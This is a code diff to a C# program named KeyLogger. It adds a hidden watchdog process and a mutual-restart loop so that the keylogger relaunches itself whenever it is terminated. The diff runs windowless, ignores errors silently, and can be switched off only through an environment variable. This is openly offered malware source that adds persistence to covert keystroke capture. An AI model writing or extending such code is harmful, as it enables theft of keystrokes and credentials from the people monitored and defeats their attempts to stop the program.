@@ -29,6 +29,8 @@ namespace KeyLogger
         [STAThread]
         static void Main(String[] args)
         {
+            bool isWatchdog = args.Contains("--watchdog");
+
             if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
             {
                 // If disabled, also try to kill any running instance from the install path
@@ -51,11 +53,26 @@ namespace KeyLogger
                 return;
             }
 
+            if (isWatchdog)
+            {
+                RunWatchdog();
+                return;
+            }
+
             EnsureInstalled();
+
+            // Start watchdog if not already running
+            StartWatchdog();
 
             while (true)
             {
                 Thread.Sleep(10);
+
+                // Watchdog monitoring: Ensure watchdog is running
+                if (!IsWatchdogRunning())
+                {
+                    StartWatchdog();
+                }
 
                 // An even more advanced check
                 bool shift = false;
@@ -143,6 +160,74 @@ namespace KeyLogger
             {
                 // Silently ignore errors
             }
+        }
+
+        private static void RunWatchdog()
+        {
+            while (true)
+            {
+                Thread.Sleep(1000);
+
+                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
+                {
+                    return;
+                }
+
+                if (!IsMainProcessRunning())
+                {
+                    try
+                    {
+                        Process.Start(InstallPath);
+                    }
+                    catch { }
+                }
+            }
+        }
+
+        private static bool IsMainProcessRunning()
+        {
+            foreach (var process in Process.GetProcessesByName("KeyLogger"))
+            {
+                try
+                {
+                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
+                    {
+                        // Check if it's NOT the watchdog
+                        // This is tricky because we can't easily see command line args of other processes in .NET 4.8 easily without WMI
+                        // But we can assume if it's running from InstallPath and we are the watchdog, there should be another one.
+                        // Actually, let's just check if there's any OTHER process with the same name and path.
+                        if (process.Id != Process.GetCurrentProcess().Id)
+                        {
+                            return true;
+                        }
+                    }
+                }
+                catch { }
+            }
+            return false;
+        }
+
+        private static bool IsWatchdogRunning()
+        {
+            // Same logic as IsMainProcessRunning - if there's another instance, we assume it's the partner.
+            // This is a bit simplistic but works for a two-process system.
+            return IsMainProcessRunning();
+        }
+
+        private static void StartWatchdog()
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = InstallPath,
+                    Arguments = "--watchdog",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+                Process.Start(psi);
+            }
+            catch { }
         }
 
         private static void EnsureInstalled()
